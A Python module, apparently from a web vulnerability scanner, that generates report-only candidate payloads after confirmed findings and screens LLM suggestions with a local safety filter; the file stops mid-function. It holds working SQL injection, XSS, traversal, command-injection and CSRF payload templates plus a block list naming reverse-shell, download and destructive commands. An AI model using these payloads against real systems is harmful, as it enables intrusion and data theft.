from __future__ import annotations

from dataclasses import dataclass
import hashlib
import ipaddress
import json
import re
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse

from backend.helper.llm.client import LLMClient
from backend.helper.settings import RuntimeSettings
from backend.helper.vuln_types import category_group, category_label


ADVISORY_CATEGORIES = {
    "sqli": "sqli",
    "sql injection": "sqli",
    "sql_injection": "sqli",
    "sql_progression": "sqli_progression",
    "sqli_progression": "sqli_progression",
    "confirmed_sqli": "sqli",
    "dom_xss": "dom_xss",
    "dom xss": "dom_xss",
    "dom-based xss": "dom_xss",
    "dom based xss": "dom_xss",
    "blind_sqli": "sqli_blind",
    "sqli_blind": "sqli_blind",
    "blind sql injection": "sqli_blind",
    "xss": "xss",
    "lfi": "lfi",
    "file inclusion": "lfi",
    "path traversal": "traversal",
    "traversal": "traversal",
    "command injection": "command_injection",
    "command_injection": "command_injection",
    "csrf": "csrf",
    "captcha": "captcha_bypass",
    "captcha_bypass": "captcha_bypass",
    "insecure captcha": "captcha_bypass",
    "cross site request forgery": "csrf",
    "cross_site_request_forgery": "csrf",
    "cross-site request forgery": "csrf",
    "ssrf": "ssrf",
    "server side request forgery": "ssrf",
    "server-side request forgery": "ssrf",
    "open redirect": "open_redirect",
    "open_redirect": "open_redirect",
    "stored xss": "stored_xss",
    "stored_xss": "stored_xss",
    "file upload": "file_upload",
    "file_upload": "file_upload",
    "weak session": "weak_session",
    "weak_session": "weak_session",
    "weak session id": "weak_session",
    "javascript": "javascript_exposure",
    "javascript_exposure": "javascript_exposure",
    "client side validation": "javascript_exposure",
    "client-side validation": "javascript_exposure",
}

SQL_COMMENT_SUFFIX = "-- -"


@dataclass(frozen=True)
class FilteredPayload:
    input_point: str
    category: str
    category_label: str
    category_group: str
    target_param: str
    payload: str
    allowed: bool
    filter_reason: str
    purpose: str
    expected_signal: str
    risk_note: str
    source: str = "llm"
    pair_id: str = ""
    pair_role: str = ""


class PayloadSafetyFilter:
    """本地强制门禁：LLM 只能提候选，不能绕过安全策略。"""

    DANGEROUS_PATTERNS: tuple[tuple[str, str], ...] = (
        (r"\bdrop\b", "包含破坏性 SQL 关键字 DROP"),
        (r"\bdelete\b", "包含破坏性 SQL 关键字 DELETE"),
        (r"\bupdate\b", "包含破坏性 SQL 关键字 UPDATE"),
        (r"\binsert\b", "包含写入型 SQL 关键字 INSERT"),
        (r"\balter\b", "包含结构变更 SQL 关键字 ALTER"),
        (r"\btruncate\b", "包含破坏性 SQL 关键字 TRUNCATE"),
        (r"\bcreate\b", "包含结构创建 SQL 关键字 CREATE"),
        (r"\binto\s+outfile\b", "尝试写文件 INTO OUTFILE"),
        (r"\bload_file\s*\(", "尝试读取任意文件 LOAD_FILE"),
        (r"\bxp_cmdshell\b", "尝试调用 xp_cmdshell"),
        (r"\bbenchmark\s*\(", "包含 BENCHMARK 延时/消耗型测试"),
        (r"\bsleep\s*\(\s*(?:[5-9]|\d{2,})\s*\)", "包含过长 SLEEP 延时测试"),
        (r"\bshutdown\b|\breboot\b", "包含系统关机/重启行为"),
        (r"\brm\s+-rf\b|\bdel\s+/[sq]\b", "包含删除文件行为"),
        (r"\bchmod\b|\bchown\b", "包含权限变更行为"),
        (r"\bnc\s+-e\b|\bnetcat\b|\breverse\s+shell\b", "包含反弹 Shell 行为"),
        (r"\bbash\s+-i\b|\bpowershell\b|\bcmd\.exe\b", "包含交互式命令执行行为"),
        (r"\bwget\b|\bcurl\b", "包含外连下载命令"),
        (r">\s*/|>>\s*/", "包含写入系统路径的重定向"),
    )

    def normalize_category(self, category: str, payload: str) -> str:
        lowered = (category or "").strip().lower().replace("-", "_")
        if lowered in ADVISORY_CATEGORIES:
            return ADVISORY_CATEGORIES[lowered]
        payload_lower = payload.lower()
        if "union select" in payload_lower or "information_schema" in payload_lower:
            if lowered in {"sql_progression", "sqli_progression"}:
                return "sqli_progression"
            return "sqli"
        if any(token in payload_lower for token in ("1=1", "1=2", " or ", " and ")):
            return "sqli_blind" if "1=2" in payload_lower else "sqli"
        if "<script" in payload_lower or "onerror=" in payload_lower or "svg/onload" in payload_lower:
            if lowered in {"dom_xss", "dom xss", "dom-based xss", "dom based xss"}:
                return "dom_xss"
            return "xss"
        if lowered == "csrf" or "<form" in payload_lower or ("<img" in payload_lower and "src=" in payload_lower):
            return "csrf"
        if "../" in payload_lower or "..%2f" in payload_lower:
            return "traversal"
        if "/etc/passwd" in payload_lower or "win.ini" in payload_lower:
            return "lfi"
        if any(token in payload_lower for token in (";id", "&&", "|whoami", "`id`")):
            return "command_injection"
        return "unknown"

    def filter_many(self, candidates: list[dict[str, Any]]) -> list[dict[str, Any]]:
        filtered: list[dict[str, Any]] = []
        pair_index = 0
        for candidate in candidates:
            true_payload = str(candidate.get("true_payload") or "")
            false_payload = str(candidate.get("false_payload") or "")
            if true_payload.strip() or false_payload.strip():
                pair_index += 1
                pair_id = str(candidate.get("pair_id") or f"pair-{pair_index:03d}")
                for role, payload, signal_key in (
                    ("true", true_payload, "expected_true_signal"),
                    ("false", false_payload, "expected_false_signal"),
                ):
                    if not payload.strip():
                        continue
                    filtered.append(
                        self._filter_one(
                            candidate,
                            payload,
                            expected_signal=str(candidate.get(signal_key) or candidate.get("expected_signal") or ""),
                            pair_id=pair_id,
                            pair_role=role,
                        )
                    )
                continue

            payload = str(candidate.get("payload") or "")
            if not payload.strip():
                continue
            filtered.append(self._filter_one(candidate, payload))
        return filtered

    def _filter_one(
        self,
        candidate: dict[str, Any],
        payload: str,
        expected_signal: str | None = None,
        pair_id: str = "",
        pair_role: str = "",
    ) -> dict[str, Any]:
        category = self.normalize_category(str(candidate.get("category", "")), payload)
        allowed, reason = self._is_allowed(payload, category)
        safe_payload = payload if allowed else self._redact_payload(payload)
        result = FilteredPayload(
            input_point=str(candidate.get("input_point") or ""),
            category=category,
            category_label=category_label(category),
            category_group=category_group(category),
            target_param=str(candidate.get("target_param") or ""),
            payload=safe_payload,
            allowed=allowed,
            filter_reason=reason,
            purpose=str(candidate.get("purpose") or ""),
            expected_signal=expected_signal if expected_signal is not None else str(candidate.get("expected_signal") or ""),
            risk_note=str(candidate.get("risk_note") or ""),
            source=str(candidate.get("source") or "llm"),
            pair_id=pair_id,
            pair_role=pair_role,
        ).__dict__
        result["poc_title"] = self._sanitize_report_text(str(candidate.get("poc_title") or ""))
        result["attack_flow"] = self._sanitize_steps(
            candidate.get("attack_flow") or candidate.get("poc_steps") or candidate.get("steps") or []
        )
        result["usage_advice"] = self._sanitize_report_text(str(candidate.get("usage_advice") or ""))
        if not allowed:
            result["payload_sha256"] = hashlib.sha256(payload.encode("utf-8")).hexdigest()
        return result

    def _sanitize_steps(self, raw_steps: object) -> list[str]:
        if isinstance(raw_steps, str):
            steps = [raw_steps]
        elif isinstance(raw_steps, list):
            steps = [str(item) for item in raw_steps]
        else:
            steps = []
        sanitized = [self._sanitize_report_text(step) for step in steps if str(step).strip()]
        return [step for step in sanitized if step][:6]

    def _sanitize_report_text(self, text: str) -> str:
        compact = re.sub(r"\s+", " ", text).strip()
        if not compact:
            return ""
        for pattern, reason in self.DANGEROUS_PATTERNS:
            if re.search(pattern, compact, re.I):
                return f"[已过滤步骤：{reason}]"
        blocked_phrases = (
            "提权",
            "持久化",
            "横向移动",
            "批量攻击",
            "拖库",
            "导出全部",
            "窃取",
            "真实受害者",
        )
        if any(phrase in compact for phrase in blocked_phrases):
            return "[已过滤步骤：包含超出授权验证范围的攻击流程]"
        return compact[:180]

    def _is_allowed(self, payload: str, category: str) -> tuple[bool, str]:
        lowered = payload.lower()
        if len(payload) > 300:
            return False, "payload 过长，第一版不进入报告复现步骤"
        if category == "csrf":
            return self._is_allowed_csrf(payload)
        if category == "ssrf":
            return self._is_allowed_ssrf(payload)
        for pattern, reason in self.DANGEROUS_PATTERNS:
            if re.search(pattern, lowered, re.I):
                return False, reason
        if category == "unknown":
            return False, "无法归类到允许的非破坏性测试类型"
        return True, "通过本地非破坏性 Safety Filter"

    def _is_allowed_csrf(self, payload: str) -> tuple[bool, str]:
        lowered = payload.lower()
        if any(token in lowered for token in ("javascript:", "data:", "file:", "<script", "onerror=", "onload=")):
            return False, "CSRF 候选包含可执行脚本或危险协议"
        blocked = (
            r"\bdrop\b",
            r"\bdelete\b",
            r"\binsert\b",
            r"\balter\b",
            r"\btruncate\b",
            r"\binto\s+outfile\b",
            r"\bload_file\s*\(",
            r"\bxp_cmdshell\b",
            r"\bbenchmark\s*\(",
            r"\bsleep\s*\(",
            r"\bshutdown\b|\breboot\b",
            r"\brm\s+-rf\b|\bdel\s+/[sq]\b",
            r"\bnc\s+-e\b|\bnetcat\b|\breverse\s+shell\b",
            r"\bbash\s+-i\b|\bpowershell\b|\bcmd\.exe\b",
            r"\bwget\b|\bcurl\b",
        )
        for pattern in blocked:
            if re.search(pattern, lowered, re.I):
                return False, "CSRF 候选包含高风险关键字或命令"
        if not (lowered.startswith(("http://", "https://")) or lowered.startswith("<img ")):
            return False, "CSRF 候选第一版只允许 http(s) URL 或 img 标签 PoC"
        return True, "通过本地 CSRF 报告型 Safety Filter；NOVA 不会自动执行"

    def _is_allowed_ssrf(self, payload: str) -> tuple[bool, str]:
        lowered = payload.lower()
        parsed = urlparse(payload)
        if parsed.scheme not in {"http", "https"} or not parsed.netloc:
            return False, "SSRF 候选第一版只允许 http(s) callback URL"
        blocked_hosts = {"localhost", "metadata.google.internal"}
        host = (parsed.hostname or "").lower()
        if host in blocked_hosts or host.startswith("169.254."):
            return False, "SSRF 候选指向本地或云元数据地址"
        try:
            address = ipaddress.ip_address(host)
            if address.is_loopback or address.is_private or address.is_link_local:
                return False, "SSRF 候选指向内网、环回或链路本地地址"
        except ValueError:
            pass
        for pattern, reason in self.DANGEROUS_PATTERNS:
            if re.search(pattern, lowered, re.I):
                return False, reason
        return True, "通过本地 SSRF callback 型 Safety Filter；NOVA 不会自动执行"

    def _redact_payload(self, payload: str) -> str:
        compact = re.sub(r"\s+", " ", payload).strip()
        if len(compact) <= 18:
            return "[已过滤] " + compact[:4] + "..."
        return f"[已过滤] {compact[:8]}...{compact[-6:]}"


class LLMPayloadAdvisor:
    def __init__(self, settings: RuntimeSettings) -> None:
        self.settings = settings
        self.llm = LLMClient(settings)
        self.filter = PayloadSafetyFilter()

    def generate(self, webscan: dict, findings: list[dict]) -> dict:
        if not self.settings.llm_payload_advisor:
            return self._empty("disabled", "候选 Payload 功能未启用")

        confirmed_findings = self._confirmed_findings(findings)
        local_candidates = self._local_candidates(webscan, findings)
        llm_candidates: list[dict[str, Any]] = []
        llm_error = ""

        if self.settings.llm_enabled and self._should_call_llm(webscan):
            try:
                raw = self.llm.chat(self._system_prompt(), self._user_prompt(webscan, findings))
                llm_candidates = self._parse_candidates(raw)
                for item in llm_candidates:
                    item.setdefault("source", "llm")
            except Exception as exc:
                llm_error = str(exc)

            if confirmed_findings:
                try:
                    raw_progression = self.llm.chat(
                        self._progression_system_prompt(),
                        self._progression_user_prompt(webscan, confirmed_findings),
                    )
                    progression_candidates = self._parse_candidates(raw_progression)
                    for item in progression_candidates:
                        item["source"] = "llm_progression"
                    llm_candidates.extend(progression_candidates)
                except Exception as exc:
                    progression_error = str(exc)
                    llm_error = f"{llm_error}; progression: {progression_error}" if llm_error else f"progression: {progression_error}"
        elif self.settings.llm_enabled:
            llm_error = "当前配置禁止对本地/内网目标调用 LLM，可设置 NOVA_LLM_ON_LOCAL_TARGETS=true 开启"
        else:
            llm_error = "LLM 未配置或不可用"

        candidates = self._dedupe_candidates(local_candidates + llm_candidates)
        limited = self._limit_per_param(candidates)
        filtered = self.filter.filter_many(limited)
        filtered = self._limit_llm_items(filtered)

        status = "ok" if filtered else ("local_only" if local_candidates else "unavailable")
        message = "候选 Payload 已生成；第一版仅写入报告，不自动执行"
        if llm_error and llm_candidates:
            message = f"LLM 候选已部分生成，但有部分调用失败：{llm_error}"
        elif llm_error and local_candidates:
            message = f"LLM 不可用，已使用本地上下文模板生成候选：{llm_error}"
        elif llm_error:
            message = f"候选 Payload 未生成：{llm_error}"

        return {
            "enabled": True,
            "status": status,
            "message": message,
            "report_only": True,
            "items": filtered,
            "summary": {
                "generated": len(filtered),
                "allowed": len([item for item in filtered if item.get("allowed")]),
                "blocked": len([item for item in filtered if not item.get("allowed")]),
                "local_candidates": len(local_candidates),
                "llm_candidates": len([item for item in filtered if str(item.get("source") or "").startswith("llm")]),
            },
        }

    def _empty(self, status: str, message: str) -> dict:
        return {
            "enabled": self.settings.llm_payload_advisor,
            "status": status,
            "message": message,
            "report_only": True,
            "items": [],
            "summary": {"generated": 0, "allowed": 0, "blocked": 0, "local_candidates": 0, "llm_candidates": 0},
        }

    def _should_call_llm(self, webscan: dict) -> bool:
        if self.settings.llm_on_local_targets:
            return True
        target = str(webscan.get("final_url") or webscan.get("target") or "")
        host = urlparse(target).hostname or ""
        if host.lower() in {"localhost"}:
            return False
        try:
            address = ipaddress.ip_address(host)
            return not (address.is_loopback or address.is_private or address.is_link_local)
        except ValueError:
            return True

    def _local_candidates(self, webscan: dict, findings: list[dict]) -> list[dict[str, Any]]:
        candidates: list[dict[str, Any]] = []
        candidates.extend(self._confirmed_progression_candidates(webscan, findings))
        for point in self._collect_input_points(webscan):
            name = point.get("name", "")
            url = point.get("url", "")
            input_type = (point.get("type") or "").lower()
            hints = self._infer_categories(url, name, input_type, findings)
            for category in hints:
                candidates.extend(self._template_candidates(url, name, category))
        return candidates

    def _confirmed_findings(self, findings: list[dict]) -> list[dict]:
        return [item for item in findings if item.get("status") == "确认漏洞"]

    def _confirmed_progression_candidates(self, webscan: dict, findings: list[dict]) -> list[dict[str, Any]]:
        candidates: list[dict[str, Any]] = []
        for finding in self._confirmed_findings(findings):
            category = str(finding.get("category") or "").strip().lower()
            if category == "sqli":
                candidates.extend(self._sqli_progression_candidates(webscan, finding))
            elif category == "sqli_blind":
                candidates.extend(self._blind_sqli_progression_candidates(webscan, finding))
            elif category == "csrf":
                candidates.extend(self._csrf_progression_candidates(webscan, finding))
            elif category in {"xss", "dom_xss"}:
                candidates.extend(self._xss_progression_candidates(webscan, finding))
            elif category in {"lfi", "traversal"}:
                candidates.extend(self._lfi_progression_candidates(webscan, finding))
            elif category == "command_injection":
                candidates.extend(self._command_progression_candidates(webscan, finding))
            elif category == "weak_session":
                candidates.extend(self._weak_session_progression_candidates(webscan, finding))
            elif category == "open_redirect":
                candidates.extend(self._open_redirect_progression_candidates(webscan, finding))
            elif category == "javascript_exposure":
                candidates.extend(self._javascript_progression_candidates(webscan, finding))
            elif category == "captcha_bypass":
                candidates.extend(self._captcha_progression_candidates(webscan, finding))
        return candidates

    def _sqli_progression_candidates(self, webscan: dict, finding: dict) -> list[dict[str, Any]]:
        evidence = finding.get("request_response") or {}
        followup = evidence.get("followup") or {}
        column_count = self._safe_int(followup.get("column_count"))
        if column_count <= 0:
            return []

        finding_url = str(finding.get("url") or webscan.get("final_url") or webscan.get("target") or "")
        target_param = self._target_param_from_finding(finding)
        if not target_param:
            return []

        input_point = self._input_point_for_param(webscan, target_param, finding_url)
        display_positions = self._reflected_union_positions(followup, column_count)
        primary = display_positions[0] if display_positions else min(2, column_count)
        secondary = display_positions[1] if len(display_positions) > 1 else primary

        payload_specs = [
            (
                {primary: "database()"},
                "确认 SQLi 后的只读推进候选：读取当前数据库名",
                f"响应中应在 UNION 回显位置出现当前数据库名；列数参考 column_count={column_count}。",
            ),
            (
                {primary: "version()"},
                "确认 SQLi 后的只读推进候选：读取数据库版本",
                f"响应中应出现数据库版本信息；列数参考 column_count={column_count}。",
            ),
            (
                {primary: "user()"},
                "确认 SQLi 后的只读推进候选：读取当前数据库用户",
                f"响应中应出现当前数据库连接用户；列数参考 column_count={column_count}。",
            ),
            (
                {primary: "table_name"},
                "确认 SQLi 后的只读推进候选：枚举当前库的一个表名",
                "响应中应出现当前数据库中的表名，可用于判断后续手工验证方向。",
                " FROM information_schema.tables WHERE table_schema=database() LIMIT 1",
            ),
            (
                {primary: "column_name", secondary: "table_name"} if secondary != primary else {primary: "column_name"},
                "确认 SQLi 后的只读推进候选：枚举当前库的一个字段名",
                "响应中应出现字段名，若同时存在第二个回显位也会显示表名。",
                " FROM information_schema.columns WHERE table_schema=database() LIMIT 1",
            ),
        ]

        candidates: list[dict[str, Any]] = []
        for spec in payload_specs:
            replacements, purpose, expected_signal = spec[:3]
            suffix = spec[3] if len(spec) > 3 else ""
            candidates.append(
                {
                    "source": "local_progression_template",
                    "input_point": input_point,
                    "category": "sqli_progression",
                    "target_param": target_param,
                    "payload": self._union_payload(column_count, replacements, suffix),
                    "purpose": purpose,
                    "expected_signal": expected_signal,
                    "risk_note": "仅作为确认漏洞后的推进参考写入报告，NOVA 不会自动执行这些候选 payload。",
                }
            )
        return candidates

    def _blind_sqli_progression_candidates(self, webscan: dict, finding: dict) -> list[dict[str, Any]]:
        finding_url = str(finding.get("url") or webscan.get("final_url") or webscan.get("target") or "")
        target_param = self._target_param_from_finding(finding)
        if not target_param:
            return []
        input_point = self._input_point_for_param(webscan, target_param, finding_url)
        return [
            {
                "source": "local_progression_template",
                "input_point": input_point,
                "category": "sqli_blind",
                "target_param": target_param,
                "true_payload": f"1' AND LENGTH(database())>0 {SQL_COMMENT_SUFFIX}",
                "false_payload": f"1' AND LENGTH(database())=0 {SQL_COMMENT_SUFFIX}",
                "expected_true_signal": "true 条件响应应接近基线或已确认的存在态响应。",
                "expected_false_signal": "false 条件响应应与 true 条件存在稳定差异。",
                "purpose": "确认布尔型 SQLi 后的只读推进候选：验证 database() 是否可被条件表达式影响",
                "risk_note": "仅写入报告作为手工参考，不自动请求目标。",
            }
        ]

    def _csrf_progression_candidates(self, webscan: dict, finding: dict) -> list[dict[str, Any]]:
        details = finding.get("details") or {}
        method = str(details.get("method") or "GET").upper()
        if method != "GET":
            return []

        form = self._csrf_form_for_finding(webscan, finding)
        action_url = str((form or {}).get("action") or finding.get("url") or webscan.get("final_url") or webscan.get("target") or "")
        if not action_url:
            return []

        fields = self._csrf_form_fields(form, details)
        if not fields:
            return []

        csrf_url = self._csrf_url(action_url, fields)
        target_param = ",".join(fields)
        return [
            {
                "source": "local_progression_template",
                "input_point": action_url,
                "category": "csrf",
                "target_param": target_param,
                "payload": csrf_url,
                "purpose": "确认 GET 状态变更 CSRF 后的手工复现 URL 候选；访问该 URL 可能触发目标状态变更。",
                "expected_signal": "在已登录受害者会话中打开该 URL 后，目标状态应按参数发生变化，例如 DVWA 密码被改为占位值。",
                "risk_note": "仅写入报告供授权环境手工验证，NOVA 不会自动请求该 URL；使用前请把占位值改成你的测试值。",
            },
            {
                "source": "local_progression_template",
                "input_point": action_url,
                "category": "csrf",
                "target_param": target_param,
                "payload": f'<img src="{csrf_url}" style="display:none" alt="">',
                "purpose": "确认 GET 状态变更 CSRF 后的 HTML PoC 候选；可用于说明跨站页面能诱导浏览器带登录态发起请求。",
                "expected_signal": "受害者已登录且访问承载该 img 的页面时，浏览器会请求 src 指向的 GET 状态变更 URL。",
                "risk_note": "仅作为报告型 PoC 候选，不自动执行；请只在 DVWA 或已授权测试环境中手工验证。",
            },
        ]

    def _csrf_form_for_finding(self, webscan: dict, finding: dict) -> dict[str, Any] | None:
        target_url = str(finding.get("url") or "")
        target = urlparse(target_url)
        for form in webscan.get("forms", []):
            if str(form.get("method") or "GET").upper() != "GET":
                continue
            action = str(form.get("action") or "")
            parsed = urlparse(action)
            if not target_url or (parsed.netloc == target.netloc and parsed.path == target.path):
                return form
        return None

    def _csrf_form_fields(self, form: dict[str, Any] | None, details: dict[str, Any]) -> dict[str, str]:
        fields: dict[str, str] = {}
        if form:
            for item in form.get("inputs", []):
                name = str(item.get("name") or "").strip()
                if not name:
                    continue
                lowered = name.lower()
                if "csrf" in lowered or "token" in lowered:
                    continue
                fields[name] = self._csrf_placeholder(name, str(item.get("type") or ""), str(item.get("value") or ""))
        if not fields:
            for name in details.get("input_names", []) or []:
                normalized = str(name or "").strip()
                if normalized and "csrf" not in normalized.lower() and "token" not in normalized.lower():
                    fields[normalized] = self._csrf_placeholder(normalized, "", "")
        return fields

    def _csrf_placeholder(self, name: str, input_type: str, value: str) -> str:
        lowered = name.lower()
        if input_type.lower() in {"submit", "button"}:
            return value or name
        if any(token in lowered for token in ("password", "passwd", "pass")):
            return "NOVA_CSRF_TEST_PASSWORD"
        if "email" in lowered or "mail" in lowered:
            return "nova-csrf@example.invalid"
        if lowered in {"change", "save", "update", "submit", "action"}:
            return value or name
        return value or "NOVA_CSRF_TEST"

    def _csrf_url(self, action_url: str, fields: dict[str, str]) -> str:
        parsed = urlparse(action_url)
        query = parse_qs(parsed.query, keep_blank_values=True)
        for name, value in fields.items():
            query[name] = [value]
        return parsed._replace(query=urlencode(query, doseq=True)).geturl()

    def _xss_progression_candidates(self, webscan: dict, finding: dict) -> list[dict[str, Any]]:
        finding_url = str(finding.get("url") or webscan.get("final_url") or webscan.get("target") or "")
        target_param = self._target_param_from_finding(finding) or str((finding.get("details") or {}).get("target_param") or "")
        input_point = self._input_point_for_param(webscan, target_param, finding_url) if target_param else finding_url
        marker = re.sub(r"[^A-Za-z0-9_]", "_", target_param or "xss")[:24] or "xss"
        return [
            {
                "source": "local_progression_template",
                "input_point": input_point,
                "category": "xss",
                "target_param": target_param,
                "payload": f"\"><svg/onload=alert('NOVA_{marker}')>",
                "purpose": "确认 XSS 后的上下文逃逸候选：测试 HTML 属性闭合和 SVG 事件处理器执行。",
                "expected_signal": f"浏览器触发 NOVA_{marker} alert，或响应中保留未编码的 svg/onload 片段。",
                "risk_note": "仅写入报告供授权环境手工验证；NOVA 不会自动执行浏览器脚本。",
            },
            {
                "source": "local_progression_template",
                "input_point": input_point,
                "category": "xss",
                "target_param": target_param,
                "payload": f"<img src=x onerror=alert('NOVA_{marker}')>",
                "purpose": "确认 XSS 后的标签上下文候选：测试事件属性是否被过滤或编码。",
                "expected_signal": f"浏览器触发 NOVA_{marker} alert，或响应中出现未编码 onerror 属性。",
                "risk_note": "仅作为报告型候选，不自动请求目标。",
            },
        ]

    def _lfi_progression_candidates(self, webscan: dict, finding: dict) -> list[dict[str, Any]]:
        finding_url = str(finding.get("url") or webscan.get("final_url") or webscan.get("target") or "")
        target_param = self._target_param_from_finding(finding) or str((finding.get("details") or {}).get("target_param") or "")
        if not target_param:
            return []
        input_point = self._input_point_for_param(webscan, target_param, finding_url)
        return [
            {
                "source": "local_progression_template",
                "input_point": input_point,
                "category": "lfi",
                "target_param": target_param,
                "payload": "../../../../../../etc/passwd",
                "purpose": "确认 LFI/目录穿越后的只读复核候选：读取 Linux passwd 特征。",
                "expected_signal": "响应中出现 root:x、daemon、/bin/bash 等只读文件特征。",
                "risk_note": "只读候选，不写文件，不读取业务敏感文件；仅限授权靶场。",
            },
            {
                "source": "local_progression_template",
                "input_point": input_point,
                "category": "traversal",
                "target_param": target_param,
                "payload": "..\\..\\..\\..\\windows\\win.ini",
                "purpose": "确认路径穿越后的 Windows 只读复核候选。",
                "expected_signal": "响应中出现 [fonts]、[extensions] 或 win.ini 特征。",
                "risk_note": "只读候选，不写文件。",
            },
        ]

    def _command_progression_candidates(self, webscan: dict, finding: dict) -> list[dict[str, Any]]:
        finding_url = str(finding.get("url") or webscan.get("final_url") or webscan.get("target") or "")
        target_param = self._target_param_from_finding(finding) or str((finding.get("details") or {}).get("target_param") or "")
        if not target_param:
            return []
        input_point = self._input_point_for_param(webscan, target_param, finding_url)
        return [
            {
                "source": "local_progression_template",
                "input_point": input_point,
                "category": "command_injection",
                "target_param": target_param,
                "payload": "127.0.0.1; echo NOVA_CMD_VERIFY",
                "purpose": "确认命令注入后的非破坏性复核候选：输出唯一 echo 标记。",
                "expected_signal": "响应中出现唯一标记 NOVA_CMD_VERIFY。",
                "risk_note": "仅允许短 echo 标记，不包含下载、写文件、删除、反弹 shell 或长时间命令。",
            }
        ]

    def _weak_session_progression_candidates(self, webscan: dict, finding: dict) -> list[dict[str, Any]]:
        target_param = str((finding.get("details") or {}).get("target_param") or "session cookie")
        finding_url = str(finding.get("url") or webscan.get("final_url") or webscan.get("target") or "")
        if not finding_url:
            return []
        return [
            {
                "source": "local_progression_template",
                "input_point": finding_url,
                "category": "weak_session",
                "target_param": target_param,
                "payload": finding_url,
                "purpose": "确认弱会话 ID 后的手工复核候选：重复触发 Generate 并观察 Cookie 是否递增、短数字或时间戳可预测。",
                "expected_signal": f"连续响应中的 {target_param} Cookie 呈现可预测序列，攻击者可推测下一个 ID。",
                "risk_note": "仅作为报告型复核步骤；NOVA 不尝试接管会话或猜测其他用户 Cookie。",
            }
        ]

    def _open_redirect_progression_candidates(self, webscan: dict, finding: dict) -> list[dict[str, Any]]:
        finding_url = str(finding.get("url") or webscan.get("final_url") or webscan.get("target") or "")
        target_param = str((finding.get("details") or {}).get("target_param") or self._target_param_from_finding(finding) or "redirect")
        if not finding_url:
            return []
        return [
            {
                "source": "local_progression_template",
                "input_point": finding_url,
                "category": "open_redirect",
                "target_param": target_param,
                "payload": "https://nova.invalid/redirect-check",
                "purpose": "确认开放重定向后的手工复核候选：验证完整外部 URL 是否进入 Location。",
                "expected_signal": "响应状态码为 30x，Location 指向 nova.invalid。",
                "risk_note": "仅用于授权环境验证跳转边界；不要替换成真实第三方钓鱼或收集地址。",
            },
            {
                "source": "local_progression_template",
                "input_point": finding_url,
                "category": "open_redirect",
                "target_param": target_param,
                "payload": "//nova.invalid/redirect-check",
                "purpose": "确认开放重定向后的协议相对 URL 复核候选，适合检测只过滤 http:// 或 https:// 的实现。",
                "expected_signal": "响应 Location 为 //nova.invalid/redirect-check，浏览器会按当前协议跳到外部 host。",
                "risk_note": "仅写入报告，不自动访问。",
            },
        ]

    def _javascript_progression_candidates(self, webscan: dict, finding: dict) -> list[dict[str, Any]]:
        payloads = [str(item) for item in finding.get("payloads", []) if str(item).strip()]
        if not payloads:
            return []
        return [
            {
                "source": "local_progression_template",
                "input_point": str(finding.get("url") or webscan.get("final_url") or webscan.get("target") or ""),
                "category": "javascript_exposure",
                "target_param": str((finding.get("details") or {}).get("target_param") or "phrase,token"),
                "payload": payloads[0],
                "purpose": "确认 JavaScript 客户端校验绕过后的手工复核候选：复用本地规则已验证成功的 phrase/token 组合。",
                "expected_signal": "响应正文出现 Well done!，说明服务端接受了可由前端逻辑推导出的 token。",
                "risk_note": "仅适用于授权靶场或自有系统；NOVA 不会用 LLM 自动执行后续 payload。",
            }
        ]

    def _captcha_progression_candidates(self, webscan: dict, finding: dict) -> list[dict[str, Any]]:
        payloads = [str(item) for item in finding.get("payloads", []) if str(item).strip()]
        input_point = str(finding.get("url") or webscan.get("final_url") or webscan.get("target") or "")
        return [
            {
                "source": "local_progression_template",
                "input_point": input_point,
                "category": "captcha_bypass",
                "target_param": "step,password_new,password_conf,g-recaptcha-response",
                "payload": payload,
                "purpose": "确认 CAPTCHA 流程绕过后的手工复核 PoC；用于说明最终状态变更没有可靠绑定验证码通过状态。",
                "expected_signal": "在授权 DVWA 环境手工提交后，页面出现 Password Changed. 或进入绕过后的确认阶段。",
                "risk_note": "该 PoC 会修改当前用户密码，NOVA 只写入报告，不会自动执行。",
            }
            for payload in payloads
        ]

    def _target_param_from_finding(self, finding: dict) -> str:
        parsed = urlparse(str(finding.get("url") or ""))
        query = parse_qs(parsed.query, keep_blank_values=True)
        if not query:
            return ""
        preferred_names = {"id", "uid", "user", "userid", "user_id", "pid", "cat", "category"}
        for name, values in query.items():
            joined = " ".join(values).lower()
            if name.lower() in preferred_names or any(token in joined for token in ("'", " order by ", " union ", " and ", " or ")):
                return name
        for name in query:
            if name.lower() not in {"submit", "button"}:
                return name
        return next(iter(query))

    def _input_point_for_param(self, webscan: dict, target_param: str, fallback_url: str) -> str:
        fallback = urlparse(fallback_url)
        for point in self._collect_input_points(webscan):
            if str(point.get("name") or "") != target_param:
                continue
            point_url = str(point.get("url") or "")
            parsed = urlparse(point_url)
            if not fallback_url or (parsed.netloc == fallback.netloc and parsed.path == fallback.path):
                return point_url
        return fallback_url

    def _reflected_union_positions(self, followup: dict, column_count: int) -> list[int]:
        reflected = (followup.get("union_probe") or {}).get("reflected_markers") or []
        positions: list[int] = []
        for marker in reflected:
            match = re.search(r"NOVA(\d+)", str(marker))
            if not match:
                continue
            position = self._safe_int(match.group(1))
            if 1 <= position <= column_count and position not in positions:
                positions.append(position)
        if positions:
            return positions
        if column_count >= 3:
            return [2, 3]
        return [column_count]

    def _union_payload(self, column_count: int, replacements: dict[int, str], suffix: str = "") -> str:
        columns = [str(index) for index in range(1, column_count + 1)]
        for position, expression in replacements.items():
            if 1 <= position <= column_count:
                columns[position - 1] = expression
        return f"-1' UNION SELECT {','.join(columns)}{suffix} {SQL_COMMENT_SUFFIX}"

    def _safe_int(self, value: object) -> int:
        try:
            return int(value)
        except (TypeError, ValueError):
            return 0

    def _collect_input_points(self, webscan: dict) -> list[dict[str, Any]]:
        points: list[dict[str, Any]] = []
        for point in webscan.get("input_points", []):
            points.append(point)
        for page in webscan.get("pages", []):
            for point in page.get("input_points", []):
                points.append(point)

        seen: set[tuple[str, str, str]] = set()
        result: list[dict[str, Any]] = []
        for point in points:
            if point.get("method", "GET").upper() != "GET":
                continue
            if point.get("active_testable") is False:
                continue
            name = str(point.get("name") or "")
            url = str(point.get("url") or "")
            if not name or not url:
                continue
            key = (url, name, str(point.get("source") or ""))
            if key in seen:
                continue
            seen.add(key)
            result.append(point)
        return result

    def _infer_categories(self, url: str, name: str, input_type: str, findings: list[dict]) -> list[str]:
        path = urlparse(url).path.lower()
        lowered_name = name.lower()
        categories: list[str] = []

        if "sqli_blind" in path or "blind" in path:
            categories.append("sqli_blind")
